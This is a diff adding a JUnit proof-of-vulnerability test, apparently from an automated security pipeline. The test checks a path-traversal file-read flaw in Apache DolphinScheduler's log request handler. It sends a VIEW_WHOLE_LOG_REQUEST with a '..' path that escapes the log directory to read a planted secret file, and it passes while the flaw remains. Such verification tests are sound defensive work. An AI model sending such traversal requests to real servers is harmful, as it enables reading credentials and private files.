@@ -1,0 +1,94 @@
+diff --git a/.security-pipeline/pov/LoggerPathTraversalPovTest.java b/.security-pipeline/pov/LoggerPathTraversalPovTest.java
+new file mode 100644
+index 0000000..069828f
+--- /dev/null
++++ b/.security-pipeline/pov/LoggerPathTraversalPovTest.java
+@@ -0,0 +1,88 @@
++/*
++ * Proof-of-Vulnerability test for CWE-022 (Path Traversal / Arbitrary File Read)
++ * in org.apache.dolphinscheduler.server.log.LoggerRequestProcessor.
++ *
++ * LoggerRequestProcessor.process() handles a VIEW_WHOLE_LOG_REQUEST whose body
++ * carries a fully attacker-controlled "path". The path is passed straight to
++ * LoggerUtils.readWholeFileContent(path) with no validation, so a request can
++ * escape the intended log directory (via "..") and read arbitrary files on the
++ * host, returning their content in the response.
++ *
++ * This test drives the real product code path:
++ *   Command (VIEW_WHOLE_LOG_REQUEST) -> LoggerRequestProcessor.process()
++ *   -> ViewLogRequestCommand.getPath() -> LoggerUtils.readWholeFileContent()
++ *   -> ViewLogResponseCommand written back to the channel.
++ *
++ * PASS (exit 0)  => vulnerable: the secret file located OUTSIDE the log
++ *                    directory was read and leaked in the response.
++ * FAIL (exit !=0) => a correct patch blocked the traversal / restricted the
++ *                    read to the log directory, so the secret was not leaked.
++ */
++
++package org.apache.dolphinscheduler.server.log;
++
++import org.apache.dolphinscheduler.common.utils.JSONUtils;
++import org.apache.dolphinscheduler.remote.command.Command;
++import org.apache.dolphinscheduler.remote.command.CommandType;
++import org.apache.dolphinscheduler.remote.command.log.ViewLogRequestCommand;
++import org.apache.dolphinscheduler.remote.command.log.ViewLogResponseCommand;
++
++import java.io.File;
++import java.io.FileWriter;
++
++import org.junit.Assert;
++import org.junit.Test;
++import org.mockito.ArgumentCaptor;
++import org.mockito.Mockito;
++
++import io.netty.channel.Channel;
++
++public class LoggerPathTraversalPovTest {
++
++    @Test
++    public void testArbitraryFileReadViaPathTraversal() throws Exception {
++        // Layout:
++        //   <base>/logs/           <- the "intended" log directory
++        //   <base>/secret.txt      <- a sensitive file OUTSIDE the log directory
++        File base = new File(System.getProperty("java.io.tmpdir"),
++                "pov_pathtraversal_" + System.nanoTime());
++        File logDir = new File(base, "logs");
++        Assert.assertTrue("failed to create log dir", logDir.mkdirs());
++
++        File secret = new File(base, "secret.txt");
++        String marker = "POV_SECRET_MARKER_" + System.nanoTime();
++        try (FileWriter w = new FileWriter(secret)) {
++            w.write(marker);
++        }
++
++        // Attacker-controlled path: starts inside the log directory but uses ".."
++        // to escape it and reach the sensitive file.
++        String attackPath = logDir.getAbsolutePath() + File.separator + ".."
++                + File.separator + "secret.txt";
++
++        ViewLogRequestCommand request = new ViewLogRequestCommand(attackPath);
++        Command command = new Command();
++        command.setType(CommandType.VIEW_WHOLE_LOG_REQUEST);
++        command.setBody(JSONUtils.toJsonByteArray(request));
++
++        Channel channel = Mockito.mock(Channel.class);
++        ArgumentCaptor<Command> captor = ArgumentCaptor.forClass(Command.class);
++
++        LoggerRequestProcessor processor = new LoggerRequestProcessor();
++        processor.process(channel, command);
++
++        Mockito.verify(channel).writeAndFlush(captor.capture());
++        Command response = captor.getValue();
++        Assert.assertNotNull("no response command produced", response);
++
++        ViewLogResponseCommand viewLogResponse =
++                JSONUtils.parseObject(response.getBody(), ViewLogResponseCommand.class);
++        String msg = viewLogResponse == null ? null : viewLogResponse.getMsg();
++
++        // Vulnerable behavior: the out-of-log-directory secret was read and leaked.
++        Assert.assertNotNull("response message was null", msg);
++        Assert.assertTrue(
++                "Path traversal blocked - secret content was NOT leaked (patched). msg=[" + msg + "]",
++                msg.contains(marker));
++    }
++}
